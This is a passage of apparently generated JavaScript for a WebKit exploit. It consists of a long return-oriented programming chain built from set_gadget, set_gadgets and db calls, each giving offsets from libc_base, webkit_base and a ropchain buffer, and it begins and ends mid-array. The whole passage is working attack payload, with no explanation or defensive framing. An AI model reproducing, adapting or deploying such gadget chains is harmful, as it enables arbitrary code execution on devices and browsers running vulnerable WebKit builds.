libc_base+882884, 
libc_base+793877, 
ropchain+371608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398448, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+371712, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+371848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([12, 0]); 
set_gadget(libc_base+792472,); 
db([12, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+372000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+372056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+372176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+372208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+372192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+372320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+372288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398528, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+372448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+372400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([238, 0]); 
set_gadget(libc_base+788575,); 
db([238, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+372608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+372560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+372664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+372768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+372800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+372896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+372880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+372992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+373072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+373128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([9, 0]); 
set_gadget(libc_base+792472,); 
db([9, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+373280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+373336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+373408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+373464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+398120, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+373624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965084, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+373752, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+373808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+373872, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965084, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+373960, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+373976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+374128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+374112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+374144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374328, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+374424, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+374760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+374744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+374880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+374928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+374912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+375040, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+375032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+375056, 
ropchain+375072, 
libc_base+811575, 
ropchain+375088, 
libc_base+811575, 
ropchain+378320, 
libc_base+759626, 
libc_base+793877, 
ropchain+375144, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+375224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+375280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+375376, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965084, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+375464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+375480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+375632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+375664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+375616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+375648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+375784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+375800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+375768, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+375888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+375944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+376064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+376080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+376256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+376208, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+376312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+376416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+376608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+376664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+376768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+376800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+376960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+376928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+376912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+377016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+377120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+377152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377136, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+377312, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+377264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+377416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+377400, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398144, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+377568, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+377656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965084, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+377744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+377760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+377912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+377944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+377896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+377928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+378040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+378024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+378128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+378200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965084, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+378264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+373816, 
libc_base+788575, 
ropchain+398152, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+378432, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([20, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+378568, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([46, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+378768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+378856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+378872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+379024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+379056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+379008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379040, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+379152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+379136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+379256, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393840, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398160, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+379432, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+379560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379544, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+399712, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+379704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+379672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+379720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+379848, 
webkit_base+11924577 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+379824, 
webkit_base+7438103, 
webkit_base+2810902, 
libc_base+793877, 
ropchain+379840, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965072, 4294967295]); 
set_gadgets([
libc_base+792472, 
ropchain+399720, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965064, 4294967295]); 
set_gadgets([
libc_base+792472, 
ropchain+399792, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+380040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+380088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+380184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+380168, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4096, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+380832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+380960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965064, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+381048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+381208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+381176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+381304, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965072, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+381392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
